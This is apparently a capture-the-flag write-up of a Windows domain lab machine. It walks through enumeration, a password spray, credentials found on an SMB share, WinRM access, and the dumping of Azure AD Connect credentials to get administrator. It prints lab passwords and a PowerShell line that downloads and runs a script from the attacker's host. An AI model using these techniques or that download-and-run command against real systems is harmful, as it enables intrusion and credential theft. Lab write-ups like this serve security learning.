Main steps
1. 

Learning points
1. Try using usernames as passwords if brute forcing is required
2. Some Azure AD stuff

`nmap`
![[Pasted image 20260407191300.png]]

DC ports open, domain name: `MEGABANK.LOCAL`.

Ran some user enumeration tools.
![[Pasted image 20260407191430.png]]

Both `rpcclient` and `nxc smb` returned the same 10 users.

SMB enumeration resulted in access denied for anonymous and guest.
![[Pasted image 20260407191746.png]]

AS-REP roasting was unsuccessful.
![[Pasted image 20260407192355.png]]

Did a password spray with the usernames as passwords, and found that the `SABatchJobs`account's password is its username.
![[Pasted image 20260407192642.png]]

`SABatchJobs`:` SABatchJobs `

Checked SMB shares with this account.
![[Pasted image 20260407193030.png]]

`azure_uploads` and `users$` are not default shares.

`azure_uploads` was empty but `users$` contained a few folders.
![[Pasted image 20260407193246.png]]

Under the `mhope` folder, there is an `azure.xml` file which contains credentials, most likely for the `mhope` account.
![[Pasted image 20260407193440.png]]

`mhope`: ` 4n0therD4y@n0th3r$ `

Checked these credentials against `WinRM` and found that `mhope` has access.
![[Pasted image 20260407193632.png]]

Got shell access with `evil-winrm` and retrieved the user flag.
![[Pasted image 20260407194012.png]]

Enumeration showed that the user `mhope` is part of the `Azure Admins` domain group. The machine also has `AADConnect` installed, making it likely that `Azure` has something to do with this machine.
![[Pasted image 20260407201010.png]]

Referring to this post, https://blog.xpnsec.com/azuread-connect-for-redteam/, it is possible to dump `Azure` credentials that are stored locally and decrypt them.

Used the POC found in the post, but changed the first line slightly:
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
```

Ran `iex(new-object net.webclient).downloadstring('http://10.10.14.90/test.ps1')` and dumped the password to the administrator account.
![[Pasted image 20260407201207.png]]

`administrator`: ` d0m@in4dminyeah! `

Was able to get access via `evil-winrm` with these credentials and retrieve the root flag.
![[Pasted image 20260407201351.png]]

